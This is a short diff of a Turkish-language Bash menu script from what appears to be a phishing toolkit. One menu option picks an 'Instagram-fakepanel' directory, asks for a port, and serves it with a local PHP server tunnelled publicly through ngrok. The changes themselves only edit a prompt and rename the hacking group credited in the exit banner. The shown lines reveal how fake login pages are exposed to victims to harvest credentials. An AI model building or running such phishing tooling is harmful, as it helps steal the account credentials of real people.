@@ -45,7 +45,7 @@ elif [[ $islem == 2 || $islem == 02 ]]; then
 
 elif [[ $islem == 3 || $islem == 03 ]]; then
         site="Instagram-fakepanel/"
-        read -p "Port Giriniz: " port
+        read -p "Port Giriniz →" port
         echo -e "\e[32mCode: insta02"
 	sleep 2
 	echo ""
@@ -55,7 +55,7 @@ elif [[ $islem == 3 || $islem == 03 ]]; then
 	php -S 127.0.0.1:$port > -t & ngrok http $port
 	elif [[ $islem == 9 || $islem == 99 ]]; then
 	clear
-	echo -e "\e[31mTürk Siber Timi İyi Günler Diler :)) ßß"
+	echo -e "\e[31mFR13NDS HACK GRUBU İYİ GUNLER DİLER:)"
 	sleep 1 
 	exit 1
 elif [[ $islem == 00 ]]; then
